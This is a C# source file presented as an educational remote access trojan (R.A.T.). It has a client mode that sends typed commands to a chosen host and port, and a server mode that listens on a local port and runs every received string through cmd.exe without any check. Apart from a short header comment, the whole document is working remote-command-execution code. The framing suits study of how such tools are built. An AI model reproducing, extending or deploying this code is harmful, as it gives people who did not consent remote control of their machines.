

// Hey, this code is purely for those who want to understand the
// idea of how a R.A.T. structures itself code wise.


// Author: Dashie
// Version: 1.0


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;


namespace Reverse_Shell
{
    static class Program
    {
        public static void Write(string str, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(str);
        }

        static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();

            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
            Write("> Use one of the following commands:", ConsoleColor.DarkCyan);
            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
            Write("> control   -=-   Control a server running this server.", ConsoleColor.DarkCyan);
            Write("> server    -=-   Start our server.", ConsoleColor.DarkCyan);
            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n", ConsoleColor.Gray);

            Console.ForegroundColor = ConsoleColor.Cyan;

            while (true)
            {
                Console.Write("$(Option)> ");
                string option = Console.ReadLine().ToLower();

                if (option.Equals("control"))
                    Client.control();

                else if (option.Equals("server"))
                    Server.start();
            };
        }
    };


    class Client
    {
        public static void control()
        {
            try
            {
                Console.Write("$(Target)> ");
                string host = Console.ReadLine();

                Console.Write("$(Port)> ");
                int.TryParse(Console.ReadLine(), out int port);

                Console.WriteLine($"[-] Connecting to {host}:{port} ....");

                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.Connect(host, port);

                if (!client.Connected)
                {
                    Console.WriteLine("[!] A connection could not be estabilished with the host!");
                    return;
                };

                Console.WriteLine($"[+] You are now connected with {host}:{port} !");
                Console.WriteLine("[-] Starting the interactive Dash Shell ....");
                Console.WriteLine("[!] Type !bye at any time to exit to the menu.");

                while (true)
                {
                    Console.Write("$(Dash Society/rev_shell)> ");

                    string str = Console.ReadLine();

                    if(str.ToLower().Equals("!bye"))
                    {
                        return;
                    };

                    byte[] command = Encoding.ASCII.GetBytes(str + "\n");

                    client.Send(command);

                    Console.WriteLine("[!] Command has been executed!");
                };
            }

            catch
            { 
                Console.WriteLine("[!] An error has occurred, please reconnect."); 
            };
        }
    };
    

    class Server
    {
        public static void start()
        {
            Console.WriteLine("[-] Starting local server ....");

            int rand_port = new Random().Next(10000, 65535);

            TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"), rand_port);
            listener.Start();

            Console.WriteLine($"[+] Server is now running on 127.0.0.1:{rand_port}");

            while (true)
            {
                try
                {
                    Console.WriteLine("[-] Awaiting my master ....");

                    Socket sock = listener.AcceptSocket();

                    byte[] cache = new byte[100];

                    sock.Receive(cache);

                    Console.WriteLine("[+] Master has sent me a command.");
                    Console.WriteLine("[-] Executing it ....");

                    string command = "/C " + Encoding.ASCII.GetString(cache);

                    Process shell = new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows\\System32\\cmd.exe",
                            Arguments = command,
                        },
                    };

                    shell.Start();

                    sock.Send(Encoding.ASCII.GetBytes("OK!"));
                    sock.Close();

                    Console.WriteLine("[+] I have done what the master had told me to.");
                }

                catch
                {
                    // Silencing Potential Errors
                };
            };
        }
    };
};
